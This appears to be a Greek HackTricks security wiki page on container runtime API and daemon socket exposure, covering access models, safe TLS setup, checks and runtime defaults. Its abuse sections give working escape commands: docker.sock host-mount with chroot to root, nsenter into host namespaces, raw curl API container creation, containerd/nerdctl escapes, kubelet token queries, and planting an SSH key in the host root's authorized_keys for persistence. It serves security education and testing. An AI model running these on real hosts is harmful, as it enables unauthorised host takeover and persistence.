# Έκθεση του Runtime API και του Daemon

{{#include ../../../banners/hacktricks-training.md}}

## Επισκόπηση

Πολλές πραγματικές παραβιάσεις containers δεν ξεκινούν καθόλου με διαφυγή από namespace. Ξεκινούν με πρόσβαση στο control plane του runtime. Αν ένα workload μπορεί να επικοινωνήσει με τα `dockerd`, `containerd`, CRI-O, Podman ή kubelet μέσω ενός προσαρτημένου Unix socket ή ενός εκτεθειμένου TCP listener, ο επιτιθέμενος μπορεί να είναι σε θέση να ζητήσει τη δημιουργία ενός νέου container με αυξημένα προνόμια, να προσαρτήσει το filesystem του host, να συμμετάσχει στα namespaces του host ή να ανακτήσει ευαίσθητες πληροφορίες του node. Σε αυτές τις περιπτώσεις, το runtime API είναι το πραγματικό όριο ασφαλείας και η παραβίασή του ισοδυναμεί ουσιαστικά με παραβίαση του host.

Γι' αυτό η έκθεση socket του runtime πρέπει να τεκμηριώνεται ξεχωριστά από τις προστασίες του kernel. Ένα container με συνηθισμένο seccomp, capabilities και περιορισμούς MAC μπορεί και πάλι να απέχει μία κλήση API από την παραβίαση του host, αν έχει προσαρτημένο μέσα του το `/var/run/docker.sock` ή το `/run/containerd/containerd.sock`. Η απομόνωση του τρέχοντος container από τον kernel μπορεί να λειτουργεί ακριβώς όπως προβλέπεται, ενώ το επίπεδο διαχείρισης του runtime παραμένει πλήρως εκτεθειμένο.

## Μοντέλα πρόσβασης σε Daemon

Το Docker Engine παραδοσιακά εκθέτει το προνομιούχο API του μέσω του τοπικού Unix socket στη διεύθυνση `unix:///var/run/docker.sock`. Ιστορικά, έχει επίσης εκτεθεί απομακρυσμένα μέσω TCP listeners, όπως το `tcp://0.0.0.0:2375`, ή μέσω listener με προστασία TLS στη θύρα `2376`. Η απομακρυσμένη έκθεση του daemon χωρίς ισχυρό TLS και αυθεντικοποίηση client ουσιαστικά μετατρέπει το Docker API σε απομακρυσμένη διεπαφή root.

Τα containerd, CRI-O, Podman και kubelet εκθέτουν αντίστοιχες επιφάνειες υψηλού αντίκτυπου. Οι ονομασίες και οι ροές εργασίας διαφέρουν, αλλά η λογική παραμένει ίδια. Αν η διεπαφή επιτρέπει στον καλούντα να δημιουργεί workloads, να προσαρτά διαδρομές του host, να ανακτά διαπιστευτήρια ή να τροποποιεί containers που εκτελούνται, τότε πρόκειται για προνομιούχο κανάλι διαχείρισης και πρέπει να αντιμετωπίζεται ανάλογα.

Ένα web UI διαχείρισης containers μπορεί να εκθέσει το ίδιο όριο ασφαλείας, χωρίς να παρέχει στον τοπικό λογαριασμό άμεση πρόσβαση στο socket. Για παράδειγμα, το [issue #493 του Portainer](https://github.com/portainer/portainer/issues/493) κατέγραψε επαναφορά κωδικού πρόσβασης διαχειριστή χωρίς αυθεντικοποίηση σε μια παλαιότερη έκδοση 1.11.1. Αντιμετωπίστε ένα UI που είναι προσβάσιμο τοπικά μόνο ως αφορμή για έλεγχο: επιβεβαιώστε την εγκατεστημένη έκδοση και τη συμπεριφορά αυθεντικοποίησης, την πραγματική δυνατότητα ελέγχου του διαχειριστή και το κατά πόσο το endpoint που διαχειρίζεται μπορεί να δημιουργεί containers με writable bind mount του host. Το [Portainer τεκμηριώνει](https://docs.portainer.io/admin/environments/add/docker/socket) ότι η διαχείριση μέσω socket απαιτεί πρόσβαση στο Docker socket· ένα rootless ή περιορισμένο endpoint μειώνει τον αντίκτυπο στον host. Μην συμπεραίνετε ότι υπάρχει το κενό αυθεντικοποίησης ή πρόσβαση root στον host μόνο από το όνομα μιας διεργασίας, μια θύρα ή μια συμβολοσειρά έκδοσης.

Συνηθισμένες τοπικές διαδρομές που αξίζει να ελέγξετε είναι οι εξής:

```text
/var/run/docker.sock
/run/docker.sock
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/var/run/kubelet.sock
/run/buildkit/buildkitd.sock
/run/firecracker-containerd.sock
```

Παλαιότερα ή πιο εξειδικευμένα stacks μπορεί επίσης να εκθέτουν endpoints όπως τα `dockershim.sock`, `frakti.sock` ή `rktlet.sock`. Είναι λιγότερο συνηθισμένα σε σύγχρονα περιβάλλοντα, αλλά όταν τα συναντάτε, πρέπει να τα αντιμετωπίζετε με την ίδια προσοχή, καθώς αποτελούν επιφάνειες ελέγχου του runtime και όχι συνηθισμένα application sockets.

## Ασφαλής απομακρυσμένη πρόσβαση

Αν ένας daemon πρέπει να εκτεθεί πέρα από το τοπικό socket, η σύνδεση πρέπει να προστατεύεται με TLS και, κατά προτίμηση, με αμοιβαία authentication, ώστε ο daemon να επαληθεύει τον client και ο client τον daemon. Η παλιά συνήθεια να ανοίγετε τον Docker daemon μέσω απλού HTTP για λόγους ευκολίας είναι ένα από τα πιο επικίνδυνα λάθη στη διαχείριση containers, επειδή το API είναι αρκετά ισχυρό ώστε να δημιουργεί απευθείας προνομιούχα containers.

Το ιστορικό μοτίβο ρύθμισης του Docker έμοιαζε ως εξής:

```bash
DOCKER_OPTS="-H unix:///var/run/docker.sock -H tcp://192.168.56.101:2376"
sudo service docker restart
```

Σε hosts που βασίζονται στο systemd, η επικοινωνία με τον daemon μπορεί επίσης να εμφανίζεται ως `fd://`, που σημαίνει ότι η διεργασία κληρονομεί ένα socket που έχει ανοίξει εκ των προτέρων το systemd, αντί να το δεσμεύει απευθείας η ίδια. Το σημαντικό δίδαγμα δεν είναι η ακριβής σύνταξη, αλλά η συνέπεια για την ασφάλεια. Από τη στιγμή που ο daemon ακούει σε κάτι πέρα από ένα τοπικό socket με αυστηρά δικαιώματα, η ασφάλεια μεταφοράς και η αυθεντικοποίηση των client είναι υποχρεωτικές και όχι προαιρετική ενίσχυση της ασφάλειας.

## Κατάχρηση

Αν υπάρχει runtime socket, επιβεβαιώστε ποιο είναι, αν υπάρχει συμβατός client και αν είναι δυνατή η πρόσβαση μέσω raw HTTP ή gRPC:

```bash
find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
ss -xl | grep -E 'docker|containerd|crio|podman|kubelet' 2>/dev/null
docker -H unix:///var/run/docker.sock version 2>/dev/null
podman --url unix:///run/podman/podman.sock info 2>/dev/null
nerdctl --address /run/containerd/containerd.sock --namespace k8s.io ps 2>/dev/null
ctr --address /run/containerd/containerd.sock images ls 2>/dev/null
crictl --runtime-endpoint unix:///run/containerd/containerd.sock ps 2>/dev/null
crictl --runtime-endpoint unix:///var/run/crio/crio.sock ps 2>/dev/null
buildctl --addr unix:///run/buildkit/buildkitd.sock debug workers 2>/dev/null
```

Αυτές οι εντολές είναι χρήσιμες, επειδή διακρίνουν μια ανενεργή διαδρομή από ένα προσαρτημένο αλλά μη προσβάσιμο socket και από ένα ενεργό privileged API. Αν ο client λειτουργήσει, το επόμενο ερώτημα είναι αν το API μπορεί να εκκινήσει ένα νέο container με host bind mount ή κοινή χρήση host namespace.

### Όταν δεν είναι εγκατεστημένος κανένας client

Η απουσία των `docker`, `podman` ή κάποιου άλλου εύχρηστου CLI δεν σημαίνει ότι το socket είναι ασφαλές. Το Docker Engine χρησιμοποιεί HTTP μέσω του Unix socket του, ενώ το Podman εκθέτει τόσο ένα API συμβατό με το Docker όσο και ένα εγγενές API Libpod μέσω του `podman system service`. Αυτό σημαίνει ότι ένα ελάχιστο περιβάλλον με μόνο το `curl` μπορεί και πάλι να αρκεί για τον χειρισμό του daemon:

```bash
curl --unix-socket /var/run/docker.sock http://localhost/_ping
curl --unix-socket /var/run/docker.sock http://localhost/v1.54/images/json
curl --unix-socket /var/run/docker.sock \
  -H 'Content-Type: application/json' \
  -d '{"Image":"ubuntu:24.04","Cmd":["id"],"HostConfig":{"Binds":["/:/host"]}}' \
  -X POST http://localhost/v1.54/containers/create

curl --unix-socket /run/podman/podman.sock http://d/_ping
curl --unix-socket /run/podman/podman.sock http://d/v1.40.0/images/json
```

Αυτό έχει σημασία κατά το post-exploitation, επειδή οι defenders μερικές φορές αφαιρούν τα συνηθισμένα client binaries, αλλά αφήνουν προσαρτημένο το management socket. Σε hosts με Podman, θυμηθείτε ότι το path υψηλής αξίας διαφέρει μεταξύ rootful και rootless deployments: `unix:///run/podman/podman.sock` για rootful service instances και `unix://$XDG_RUNTIME_DIR/podman/podman.sock` για rootless ones.

### Πλήρες παράδειγμα: Από το Docker Socket σε root του host

Αν είναι προσβάσιμο το `docker.sock`, η κλασική διαφυγή είναι να ξεκινήσετε ένα νέο container που προσαρτά το root filesystem του host και, στη συνέχεια, να εκτελέσετε `chroot` σε αυτό:

```bash
docker -H unix:///var/run/docker.sock images
docker -H unix:///var/run/docker.sock run --rm -it -v /:/host ubuntu:24.04 chroot /host /bin/bash
```

Αυτό παρέχει άμεση εκτέλεση ως root στο host μέσω του Docker daemon. Ο αντίκτυπος δεν περιορίζεται στην ανάγνωση αρχείων. Μόλις βρεθεί μέσα στο νέο container, ο επιτιθέμενος μπορεί να τροποποιήσει αρχεία του host, να συλλέξει διαπιστευτήρια, να εγκαταστήσει μηχανισμούς persistence ή να εκκινήσει επιπλέον προνομιούχα workloads.

### Πλήρες παράδειγμα: Docker Socket προς namespaces του host

Αν ο επιτιθέμενος προτιμά την είσοδο σε namespaces αντί για πρόσβαση μόνο στο filesystem:

```bash
docker -H unix:///var/run/docker.sock run --rm -it --pid=host --privileged ubuntu:24.04 bash
nsenter --target 1 --mount --uts --ipc --net --pid -- bash
```

Αυτή η διαδρομή φτάνει στον host ζητώντας από το runtime να δημιουργήσει ένα νέο container με ρητή έκθεση των namespaces του host, αντί να εκμεταλλευτεί το τρέχον container.

### Μοτίβο persistence μέσω Docker Socket

Ο έλεγχος του runtime μπορεί επίσης να χρησιμοποιηθεί για persistence και όχι μόνο για ένα shell μίας χρήσης. Το γενικό μοτίβο είναι να δημιουργηθεί ένα βοηθητικό container με mount στον host, να εγγραφεί στο προσαρτημένο filesystem του host υλικό εξουσιοδοτημένης πρόσβασης ή ένα startup hook και, στη συνέχεια, να επαληθευτεί ότι ο host το χρησιμοποιεί.

Ενδεικτική μορφή:

```bash
docker -H unix:///var/run/docker.sock run -d --name helper -v /:/host ubuntu:24.04 sleep infinity
docker -H unix:///var/run/docker.sock exec helper sh -c 'mkdir -p /host/root/.ssh && chmod 700 /host/root/.ssh'
docker -H unix:///var/run/docker.sock cp ./id_ed25519.pub helper:/tmp/key.pub
docker -H unix:///var/run/docker.sock exec helper sh -c 'cat /tmp/key.pub >>/host/root/.ssh/authorized_keys'
```

Η ίδια ιδέα μπορεί να στοχεύσει μονάδες systemd, τμήματα cron, αρχεία εκκίνησης εφαρμογών ή κλειδιά SSH, ανάλογα με το τι θέλει να αποδείξει ο χειριστής. Το σημαντικό είναι ότι η μόνιμη αλλαγή γίνεται μέσω της εξουσιοδότησης του runtime daemon στο filesystem του host και όχι μέσω επιπλέον προνομίων στο αρχικό container.

### Pivot με βοηθητικό εργαλείο μέσω του Raw Docker API

Όταν λείπει το Docker CLI, η ίδια ροή με helper και host mount μπορεί να εκτελεστεί μέσω HTTP πάνω από το Unix socket. Η γενική ροή είναι: επιβεβαίωση του API, δημιουργία helper container με bind mount του host, εκκίνησή του, δημιουργία exec instance και εκκίνηση αυτού του exec.

```bash
curl --unix-socket /var/run/docker.sock http://localhost/_ping
curl --unix-socket /var/run/docker.sock \
  -H 'Content-Type: application/json' \
  -d '{"Image":"ubuntu:24.04","Cmd":["sleep","3600"],"HostConfig":{"Binds":["/:/host:rw"]}}' \
  -X POST http://localhost/v1.54/containers/create?name=helper
curl --unix-socket /var/run/docker.sock -X POST http://localhost/v1.54/containers/helper/start
curl --unix-socket /var/run/docker.sock \
  -H 'Content-Type: application/json' \
  -d '{"AttachStdout":true,"AttachStderr":true,"Cmd":["chroot","/host","id"]}' \
  -X POST http://localhost/v1.54/containers/helper/exec
```

Το τελικό αίτημα `/exec/<id>/start` εξαρτάται από το exec ID που επιστρέφεται, αλλά το ζήτημα ασφάλειας δεν εξαρτάται από τον ακριβή χειρισμό του JSON: η ακατέργαστη πρόσβαση API σε ένα rootful Docker daemon αρκεί για να ζητηθεί ένα ισχυρότερο βοηθητικό workload.

### Πλήρες παράδειγμα: socket containerd

Ένα προσαρτημένο socket `containerd` είναι συνήθως εξίσου επικίνδυνο:<sup>[[1]](#references)</sup>

```bash
ctr --address /run/containerd/containerd.sock images pull docker.io/library/busybox:latest
ctr --address /run/containerd/containerd.sock run --tty --privileged --mount type=bind,src=/,dst=/host,options=rbind:rw docker.io/library/busybox:latest host /bin/sh
chroot /host /bin/sh
```

Αν υπάρχει διαθέσιμος ένας client πιο κοντά στο Docker, το `nerdctl` μπορεί να είναι πιο βολικό από το `ctr`, επειδή προσφέρει οικείες επιλογές όπως `--privileged`, `--pid=host` και `-v`:

```bash
nerdctl --address /run/containerd/containerd.sock --namespace k8s.io run --rm -it \
  --privileged --pid=host -v /:/host docker.io/library/alpine:latest sh
chroot /host /bin/sh
```

Ο αντίκτυπος είναι και πάλι η παραβίαση του host. Ακόμη κι αν απουσιάζουν τα ειδικά εργαλεία του Docker, κάποιο άλλο runtime API μπορεί να παρέχει την ίδια διαχειριστική ισχύ. Σε κόμβους Kubernetes, το `crictl` μπορεί επίσης να αρκεί για reconnaissance και αλληλεπίδραση με containers, καθώς επικοινωνεί απευθείας με το endpoint του CRI.

### BuildKit Socket

Το `buildkitd` είναι εύκολο να παραβλεφθεί, επειδή πολλοί το θεωρούν «απλώς το backend του build», αλλά ο daemon παραμένει ένα προνομιούχο control plane. Ένα προσβάσιμο `buildkitd.sock` μπορεί να επιτρέψει σε έναν attacker να εκτελέσει αυθαίρετα βήματα build, να επιθεωρήσει τις δυνατότητες των workers, να χρησιμοποιήσει local contexts από το παραβιασμένο περιβάλλον και να ζητήσει επικίνδυνα entitlements, όπως `network.host` ή `security.insecure`, εφόσον ο daemon έχει ρυθμιστεί ώστε να τα επιτρέπει.

Οι πρώτες χρήσιμες αλληλεπιδράσεις είναι οι εξής:

```bash
buildctl --addr unix:///run/buildkit/buildkitd.sock debug workers
buildctl --addr unix:///run/buildkit/buildkitd.sock du
```

Αν ο daemon δέχεται αιτήματα build, ελέγξτε αν είναι διαθέσιμα μη ασφαλή entitlements:

```bash
buildctl --addr unix:///run/buildkit/buildkitd.sock build \
  --frontend dockerfile.v0 \
  --local context=. \
  --local dockerfile=. \
  --allow network.host \
  --allow security.insecure \
  --output type=local,dest=/tmp/buildkit-out
```

Ο ακριβής αντίκτυπος εξαρτάται από τη διαμόρφωση του daemon, αλλά μια υπηρεσία BuildKit με rootful πρόσβαση και permissive entitlements δεν είναι μια ακίνδυνη διευκόλυνση για developers. Αντιμετωπίστε την ως μια ακόμη επιφάνεια διαχείρισης υψηλής αξίας, ειδικά σε CI runners και κοινόχρηστους build nodes.

### Kubelet API μέσω TCP

Το kubelet δεν είναι container runtime, αλλά εξακολουθεί να αποτελεί μέρος του επιπέδου διαχείρισης του node και συχνά βρίσκεται στο ίδιο πλαίσιο συζήτησης για τα όρια εμπιστοσύνης. Αν η secure θύρα του kubelet `10250` είναι προσβάσιμη από το workload ή αν εκτεθούν διαπιστευτήρια node, kubeconfigs ή δικαιώματα proxy, ο attacker μπορεί να είναι σε θέση να απαριθμήσει Pods, να ανακτήσει logs ή να εκτελέσει εντολές σε containers τοπικά στο node, χωρίς να περάσει ποτέ από τη διαδρομή admission του Kubernetes API server.

Ξεκινήστε με γρήγορη αναζήτηση:

```bash
curl -sk https://127.0.0.1:10250/pods
curl -sk https://127.0.0.1:10250/runningpods/
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null)
curl -sk -H "Authorization: Bearer $TOKEN" https://127.0.0.1:10250/pods
```

Αν η διαδρομή μέσω του proxy του kubelet ή του API-server επιτρέπει το `exec`, ένας client που υποστηρίζει WebSocket μπορεί να το μετατρέψει σε εκτέλεση κώδικα σε άλλα containers του node. Γι’ αυτό και το `nodes/proxy` με δικαίωμα μόνο `get` είναι πιο επικίνδυνο απ’ όσο ακούγεται: το αίτημα μπορεί και πάλι να φτάσει σε endpoints του kubelet που εκτελούν εντολές, ενώ αυτές οι απευθείας αλληλεπιδράσεις με το kubelet δεν εμφανίζονται στα κανονικά Kubernetes audit logs.<sup>[[2]](#references)</sup>

## Checks

Στόχος αυτών των ελέγχων είναι να διαπιστωθεί αν το container μπορεί να προσεγγίσει κάποιο επίπεδο διαχείρισης που θα έπρεπε να παραμείνει εκτός του ορίου εμπιστοσύνης.

```bash
mount | grep -E '/var/run|/run|docker.sock|containerd.sock|crio.sock|podman.sock|kubelet.sock'
ss -lntp 2>/dev/null | grep -E ':2375|:2376'
env | grep -E 'DOCKER_HOST|CONTAINERD_ADDRESS|CRI_CONFIG_FILE|BUILDKIT_HOST|XDG_RUNTIME_DIR'
find /run /var/run -maxdepth 3 \( -name 'buildkitd.sock' -o -name 'podman.sock' \) 2>/dev/null
```

Τι είναι ενδιαφέρον εδώ:

- Ένα προσαρτημένο runtime socket είναι συνήθως ένα άμεσο μέσο διαχείρισης και όχι απλώς αποκάλυψη πληροφοριών.
- Ένας TCP listener στη θύρα `2375` χωρίς TLS θα πρέπει να αντιμετωπίζεται ως συνθήκη απομακρυσμένου compromise.
- Μεταβλητές περιβάλλοντος όπως η `DOCKER_HOST` συχνά αποκαλύπτουν ότι το workload σχεδιάστηκε σκόπιμα ώστε να επικοινωνεί με το runtime του host.

## Προεπιλεγμένες ρυθμίσεις Runtime

| Runtime / πλατφόρμα | Προεπιλεγμένη κατάσταση | Προεπιλεγμένη συμπεριφορά | Συνήθεις χειροκίνητες αποδυναμώσεις |
| --- | --- | --- | --- |
| Docker Engine | Τοπικό Unix socket από προεπιλογή | Το `dockerd` ακούει στο τοπικό socket και ο daemon εκτελείται συνήθως με δικαιώματα root | προσάρτηση του `/var/run/docker.sock`, έκθεση του `tcp://...:2375`, αδύναμο ή ανύπαρκτο TLS στη θύρα `2376` |
| Podman | CLI χωρίς daemon από προεπιλογή | Δεν απαιτείται daemon με μακρόχρονη εκτέλεση και δικαιώματα root για τη συνήθη τοπική χρήση· τα API sockets μπορεί και πάλι να εκτεθούν όταν ενεργοποιείται το `podman system service` | έκθεση του `podman.sock`, ευρεία λειτουργία της υπηρεσίας, χρήση του API με δικαιώματα root |
| containerd | Τοπικό socket με δικαιώματα root | Το administrative API εκτίθεται μέσω του τοπικού socket και συνήθως χρησιμοποιείται από εργαλεία υψηλότερου επιπέδου | προσάρτηση του `containerd.sock`, ευρεία πρόσβαση μέσω `ctr` ή `nerdctl`, έκθεση privileged namespaces |
| CRI-O | Τοπικό socket με δικαιώματα root | Το CRI endpoint προορίζεται για αξιόπιστα στοιχεία του ίδιου του node | προσάρτηση του `crio.sock`, έκθεση του CRI endpoint σε μη αξιόπιστα workloads |
| Kubernetes kubelet | API διαχείρισης τοπικό στο node | Το kubelet δεν θα πρέπει να είναι ευρέως προσβάσιμο από Pods· ανάλογα με τα authn/authz, η πρόσβαση μπορεί να αποκαλύψει την κατάσταση των Pods, διαπιστευτήρια και δυνατότητες εκτέλεσης | προσάρτηση kubelet sockets ή certs, αδύναμο kubelet auth, host networking σε συνδυασμό με προσβάσιμο kubelet endpoint |

## References

- [1] [Εκμετάλλευση socket containerd, μέρος 1](https://thegreycorner.com/2025/02/12/containerd-socket-exploitation-part-1.html)
- [2] [Κίνδυνοι παράκαμψης του Kubernetes API Server](https://kubernetes.io/docs/concepts/security/api-server-bypass-risks/)
{{#include ../../../banners/hacktricks-training.md}}
